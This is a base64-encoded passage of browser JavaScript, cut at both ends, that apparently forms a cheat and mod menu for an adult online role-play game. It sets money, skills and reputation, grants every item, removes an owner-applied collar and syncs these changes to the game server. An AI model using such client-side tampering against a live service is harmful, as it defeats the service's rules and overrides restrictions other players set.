WVudCgib3B0aW9uIik7Cm9wdGlvbjYudmFsdWUgPSAib3B0NiI7Cm9wdGlvbjYudGV4dCA9ICJSZWxlYXNlIE93bmVyIENvbGxhciI7CnZhciBvcHRpb243ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjcudmFsdWUgPSAib3B0NyI7Cm9wdGlvbjcudGV4dCA9ICIrMSBMQVJQIExldmVsIjsKdmFyIG9wdGlvbjggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOC52YWx1ZSA9ICJvcHQ4IjsKb3B0aW9uOC50ZXh0ID0gIkJlY29tZSBFc2NhcGVkIFBhdGllbnQiOwp2YXIgb3B0aW9uOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb245LnZhbHVlID0gIm9wdDkiOwpvcHRpb245LnRleHQgPSAiQmVjb21lIENsdWIgU2xhdmUiOwp2YXIgb3B0aW9uMTAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTAudmFsdWUgPSAib3B0MTAiOwpvcHRpb24xMC50ZXh0ID0gIlJlbGVhc2UgQ2x1YiBUaXRsZSI7CnZhciBvcHRpb24xMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMS52YWx1ZSA9ICJvcHQxMSI7Cm9wdGlvbjExLnRleHQgPSAiU2V0IEdHVFMgTGV2ZWwiOwp2YXIgb3B0aW9uMTIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTIudmFsdWUgPSAib3B0MTIiOwpvcHRpb24xMi50ZXh0ID0gIlNldCBEb20vU3ViIExldmVsIjsKdmFyIG9wdGlvbjEzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEzLnZhbHVlID0gIm9wdDEzIjsKb3B0aW9uMTMudGV4dCA9ICJTZXQgTmlja25hbWUiOwp2YXIgb3B0aW9uMTQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTQudmFsdWUgPSAib3B0MTQiOwpvcHRpb24xNC50ZXh0ID0gIkZvcmNlIE9yZ2FzbSI7CnZhciBvcHRpb24xNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNS52YWx1ZSA9ICJvcHQxNSI7Cm9wdGlvbjE1LnRleHQgPSAiQkNNIERpc2NvcmQiOwp2YXIgb3B0aW9uMTYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTYudmFsdWUgPSAib3B0MTYiOwpvcHRpb24xNi50ZXh0ID0gIkZvcmNlIExvYmJ5IjsKdmFyIG9wdGlvbjE3ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE3LnZhbHVlID0gIm9wdDE3IjsKb3B0aW9uMTcudGV4dCA9ICJMQVJQIE9wdGlvbnMiOwp2YXIgb3B0aW9uMTggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTgudmFsdWUgPSAib3B0MTgiOwpvcHRpb24xOC50ZXh0ID0gIkVtb3RlIE1lbnUgKGAgKyBFKSI7CnZhciBvcHRpb24xOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOS52YWx1ZSA9ICJvcHQxOSI7Cm9wdGlvbjE5LnRleHQgPSAiUGVyc2lzdGFudCBTZXR0aW5ncyAoYCArIFMpIjsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24zKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTIpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb242KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb245KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEwKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjExKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEzKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE0KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE2KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE3KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE4KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE5KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE1KTsKCgoKLy8gQ3JlYXRlIGEgYnV0dG9uIHRvIHNob3cgdGhlIGRyb3Bkb3duIG1lbnUKdmFyIGRyb3Bkb3duQnV0dG9uID0gY3JlYXRlQnV0dG9uKCJQZXJzb25hbGlzYXRpb24iLCBmdW5jdGlvbigpIHsKICBzZWxlY3Quc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Cn0pOwovLyBDU1MgdG8gbWFrZSB0aGUgYnV0dG9uIGludmlzaWJsZSBhbmQgdGFrZSBubyBzcGFjZQpkcm9wZG93bkJ1dHRvbi5zdHlsZS5vcGFjaXR5ID0gIjAiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnRvcCA9ICItOTk5OXB4IjsKZHJvcGRvd25CdXR0b24uc3R5bGUubGVmdCA9ICItOTk5OXB4IjsKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsgLy8gU3RvcCBldmVudCBwcm9wYWdhdGlvbgp9KTsKCnNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICB2YXIgc2VsZWN0ZWRPcHRpb24gPSBzZWxlY3Qub3B0aW9uc1tzZWxlY3Quc2VsZWN0ZWRJbmRleF0udmFsdWU7CiAgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMQogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSA5OTk5OTk5CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMgogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSBwcm9tcHQoIkVudGVyIENhc2ggQW1vdW50Iik7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQzIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAzCiAgICBqYXZhc2NyaXB0OlNraWxsQ2hhbmdlKCJJbmZpbHRyYXRpb24iLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiU2VsZkJvbmRhZ2UiLCAxMCk7Ly9zZWxmLXRpZQogICAgU2tpbGxDaGFuZ2UoIldpbGxwb3dlciIsIDEwKTsvL1Jlc2lzdCBvcmdhc21zCiAgICBTa2lsbENoYW5nZSgiRXZhc2lvbiIsIDEwKTsvL0JhdHRsZSBza2lsbHMKICAgIFNraWxsQ2hhbmdlKCJCb25kYWdlIiwgMTApOy8vVGllIG90aGVycwogICAgU2tpbGxDaGFuZ2UoIkRyZXNzYWdlIiwgMTApOy8vQUJETAogICAgU2tpbGxDaGFuZ2UoIkxvY2tQaWNraW5nIiwgMTApOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNAogICAgamF2YXNjcmlwdDpSZXB1dGF0aW9uQ2hhbmdlKCJHYW1pbmciLCAxMDApOy8vQXJjYWRlIGFuZCBLaW5reUR1bmdlb24KICAgIFJlcHV0YXRpb25DaGFuZ2UoIkdhbWJsaW5nIiwgMTAwKTsvL0dhbWJsaW5nIHJvb20KICAgIFJlcHV0YXRpb25DaGFuZ2UoIkxBUlAiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTWFpZCIsIDEwMCk7Ly9DYW4gYmUgYSBNYWlkCiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJBQkRMIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIk51cnNlIiwgMTAwKTsvL0NhbiBiZSBhIE51cnNlCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ1IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA1CiAgICBqYXZhc2NyaXB0OlNlcnZlclBsYXllclN5bmMKICAgIEFzc2V0RmVtYWxlM0RDRy5mb3JFYWNoKGdyb3VwPT5ncm91cC5Bc3NldC5mb3JFYWNoKGl0ZW09PkludmVudG9yeUFkZChQbGF5ZXIsIGl0ZW0uTmFtZSwgZ3JvdXAuR3JvdXApKSk7CiAgICBTZXJ2ZXJQbGF5ZXJJbnZlbnRvcnlTeW5jKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ2IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA2CiAgICBqYXZhc2NyaXB0OkludmVudG9yeVJlbW92ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJJdGVtVXBkYXRlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBMb2dBZGQoIlJlbGVhc2VkQ29sbGFyIiwgIk93bmVyUnVsZSIpOyAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDciKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDcKICAgIGphdmFzY3JpcHQ6YWxlcnQoJ1N0YXJ0IGEgTEFSUCBzZXNzaW9uICYgc2VsZWN0IGNsYXNzIGJlZm9yZSBydW5uaW5nJyk7CiAgICBHYW1lTEFSUExldmVsUHJvZ3Jlc3MoMTAwKSAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDgiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDgKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDkiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDkKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEwIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMAogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQmxvY2tDaGFuZ2UiLCAiUnVsZSIsIEN1cnJlbnRUaW1lKTsKICAgIE1hbmFnZW1lbnRJc0NsdWJTbGF2ZSA9IGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIGZhbHNlCiAgICB9CiAgICBNYW5hZ2VtZW50Q2x1YlNsYXZlRGlhbG9nID0gZnVuY3Rpb24oUGxheWVyKSB7fQogICAgTWFuYWdlbWVudEZpbmlzaENsdWJTbGF2ZSgpCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTEKICAgIGphdmFzY3JpcHQ6YWxlcnQoJ1N0YXJ0IGEgR0dUUyBzZXNzaW9uIGJlZm9yZSBydW5uaW5nLCByZWZyZXNoIHRvIHNlZSBjaGFuZ2VzJyk7CiAgICBQbGF5ZXIuR2FtZS5HR1RTLkxldmVsID0gcHJvbXB0KCJFbnRlciBHR1RTIExldmVsICgxLTYpIik7OwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoewogICAgR2FtZTogUGxheWVyLkdhbWUKICAgIH0pOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICAgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEyIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMgogICAgamF2YXNjcmlwdDpEaWFsb2dTZXRSZXB1dGF0aW9uKCJEb21pbmFudCIsIHByb21wdCgiRW50ZXIgU3ViL0RvbSBSZXAgKC0xMDAgdG8gMTAwKSIpKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTMiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEzCiAgICBqYXZhc2NyaXB0Om5hbWUgPSBwcm9tcHQoIkVudGVyIE5pY2tuYW1lIik7OwogICAgUGxheWVyLk5pY2tuYW1lID0gbmFtZTsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsgTmlja25hbWU6IG5hbWUgfSwgdHJ1ZSk7ICAgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOyAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTQiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE0CiAgICBqYXZhc2NyaXB0OkFjdGl2aXR5U2V0QXJvdXNhbChQbGF5ZXIsIDEpOwogICAgQWN0aXZpdHlPcmdhc21QcmVwYXJlKFBsYXllciwgdHJ1ZSk7CiAgICBBY3Rpdml0eU9yZ2FzbUdhbWVSZXNpc3RDb3VudCA9IDE7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE1IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNQogICAgamF2YXNjcmlwdDp3aW5kb3cub3BlbignaHR0cHM6Ly9kaXNjb3JkLmdnL3YzSkJqeVM0bXgnLCAnX2JsYW5rJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE2IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNgogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJNYWxlIC8gRmVtYWxlIC8gTWl4ZWQiKTsKICAgIGxldCBwbGFjZWhvbGRlcjsKICAgIAogICAgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtYWxlIikgewogICAgICBwbGFjZWhvbGRlciA9ICJNIjsKICAgIH0gZWxzZSBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1peGVkIikgewogICAgICBwbGFjZWhvbGRlciA9ICJYIjsKICAgIH0gZWxzZSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIiI7CiAgICB9ICAKCiAgICAKICAgIENoYXRSb29tU3RhcnQocGxhY2Vob2xkZXIsICIiLCBudWxsLCBudWxsLCAiSW50cm9kdWN0aW9uIiwgQmFja2dyb3VuZHNUYWdMaXN0KTsKICB9KSgpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTcKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiU3RhcnQgYSBMQVJQIFJvb20gYXMgQWRtaW4gRmlyc3RcblN0YXJ0IC8gU2tpcCAvIE1peGVkIC8gU2h1ZmZsZSAvIFRlYW0gLyBXaW4gKGNvbG9yKSIpLnRvTG93ZXJDYXNlKCk7CgogICAgaWYgKGlucHV0ID09PSAic3RhcnQiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU3RhcnQiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNraXAiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU2tpcCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2h1ZmZsZSIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsgTWVtYmVyTnVtYmVyOiBDaGF0Um9vbUNoYXJhY3RlclsxXS5NZW1iZXJOdW1iZXIsIEFjdGlvbjogIlNodWZmbGUiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInRlYW0iKSB7CiAgICAgIGNvbnN0IERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeUJ1aWxkZXIoKQogICAgICAuc291cmNlQ2hhcmFjdGVyKFBsYXllcikKICAgICAgLmJ1aWxkKCk7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUNoYXQiLCB7IENvbnRlbnQ6ICJMQVJQQ2hhbmdlVGVhbUNsYXNzIiwgVHlwZTogIkFjdGlvbiIsIERpY3Rpb25hcnk6IERpY3Rpb25hcnkgfSk7CiAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKCJ3aW4iKSkgewogICAgICBsZXQgY29sb3IgPSBpbnB1dC5zbGljZSg0KS50cmltKCk7CiAgICAgIGNvbG9yID0gY29sb3IuY2hhckF0KDApLnRvVXBwZXJDYXNlKCkgKyBjb2xvci5zbGljZSgxKTsKICAgICAgR2FtZUxBUlBBZGRDaGF0TG9nKCJFbmRHYW1lIiwgUGxheWVyLCBQbGF5ZXIsIE9ubGluZUdhbWVEaWN0aW9uYXJ5VGV4dCgiVGVhbSIgKyBjb2xvciksIDAsIDAsICIjMDAwMEIwIik7CiAgICB9CiAgfSkoKTsKCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE4IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxOAogIC8vIENyZWF0ZSBhbmQgZGlzcGxheSB0aGUgYnV0dG9uIGNvbnRhaW5lcgogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTkiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE5CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNldHRpbmdzTWVudSk7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0KICAKCiAgLy8gSGlkZSB0aGUgZHJvcGRvd24gbWVudQogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9KTsKCi8vRW5kIG9mIEREIG1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy8gQWRkIGhlYWRlciwgYnV0dG9ucywgYW5kIHNlcGFyYXRvciB0byBjb250ZXh0IG1lbnUKCmZ1bmN0aW9uIHVwZGF0ZUNvbnRleHRNZW51KCkgewogIHdoaWxlIChjb250ZXh0TWVudS5maXJzdENoaWxkKSB7CiAgICBjb250ZXh0TWVudS5yZW1vdmVDaGlsZChjb250ZXh0TWVudS5maXJzdENoaWxkKTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoaGVhZGVyKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMyk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNCk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNyk7CiAgaWYgKHZpc2IpIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjgpOwogIH0gZWxzZSB7CiAgICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b245KTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMTApOwogIC8vIEFkZCB0aGUgZHJvcGRvd24gbWVudSB0byB0aGUgY29udGV4dCBtZW51CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoY3JlYXRlU2VwYXJhdG9yKCkpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGRyb3Bkb3duQnV0dG9uKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChzZWxlY3QpOwogIAp9Cgp1cGRhdGVDb250ZXh0TWVudSgpOwoKLy8gRXZlbnQgbGlzdGVuZXIgdG8gdXBkYXRlIHRoZSBtZW51IHdoZW4gb3BlbmVkCmNvbnRleHRNZW51LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZnVuY3Rpb24oKSB7CiAgdXBkYXRlQ29udGV4dE1lbnUoKTsKfSk7Cgpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKCiAgICAKfSk7CgovLyBGdW5jdGlvbiB0byBoaWRlIHRoZSBjdXN0b20gY29udGV4dCBtZW51CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICAgICAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W3N0eWxlKj0nZml4ZWQnXSIpOwogICAgICAgIGlmIChjb250ZXh0TWVudSkgewogICAgICAgICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICAgICAgfQogICAgICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgfQp9KTsKCgovL1N0YXJ0IG9mIGtleWJvYXJkIHNob3J0Y3V0c19fX19fX19fX19fX19fX19fX18KCmxldCBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKbGV0IGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihldmVudCkgewogIC8vIGNoZWNrIGlmIHRoZSBiYWNrdGljayAoYCkga2V5IGlzIHByZXNzZWQKICBpZiAoZXZlbnQua2V5ID09PSAiYCIgJiYgIWJhY2t0aWNrUHJlc3NlZCkgewogICAgYmFja3RpY2tQcmVzc2VkID0gdHJ1ZTsKICB9CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIChgKSBrZXkgaXMgcHJlc3NlZCBhbmQgc3RvcmUgdGhlIGxhc3Qga2V5IHByZXNzZWQKICBlbHNlIGlmIChiYWNrdGlja1ByZXNzZWQpIHsKICAgIGxhc3RLZXlQcmVzc2VkID0gZXZlbnQua2V5OwogIH0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIChgKSBrZXkgaXMgcmVsZWFzZWQKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogICAgbGFzdEtleVByZXNzZWQgPSBudWxsOwogIH0KfSk7CgovLyBjaGVjayBpZiB0aGUgbGFzdCBrZXkgcHJlc3NlZCB3YXMgIiwiIG9yICIuIiBhbmQgc2VuZCB0aGUgY29ycmVzcG9uZGluZyBhY3Rpb24Kc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgaWYgKGxhc3RLZXlQcmVzc2VkID09PSAiLCIgfHwgbGFzdEtleVByZXNzZWQgPT09ICIuIikgewogICAgbGV0IGFjdGlvbiA9IGxhc3RLZXlQcmVzc2VkID09PSAiLCIgPyAiTW92ZUxlZnQiIDogIk1vdmVSaWdodCI7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgewogICAgICBNZW1iZXJOdW1iZXI6IFBsYXllci5NZW1iZXJOdW1iZXIsCiAgICAgIEFjdGlvbjogYWN0aW9uLAogICAgfSk7CiAgfQp9LCA1MCk7Ci8vU3RhcnQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKLy8gRGVmaW5lIHRoZSBzZXR0aW5ncyBtZW51IGFuZCBpdHMgb3B0aW9ucwpjb25zdCBzZXR0aW5nc01lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc2V0dGluZ3NNZW51LmlkID0gInNldHRpbmdzLW1lbnUiOwpzZXR0aW5nc01lbnUuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwpzZXR0aW5nc01lbnUuc3R5bGUudG9wID0gIjIwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUubGVmdCA9ICIyMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZmZmIjsKc2V0dGluZ3NNZW51LnN0eWxlLmJvcmRlciA9ICIxcHggc29saWQgI2NjYyI7CnNldHRpbmdzTWVudS5zdHlsZS5wYWRkaW5nID0gIjNweCI7CnNldHRpbmdzTWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMTBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwpzZXR0aW5nc01lbnUuc3R5bGUuekluZGV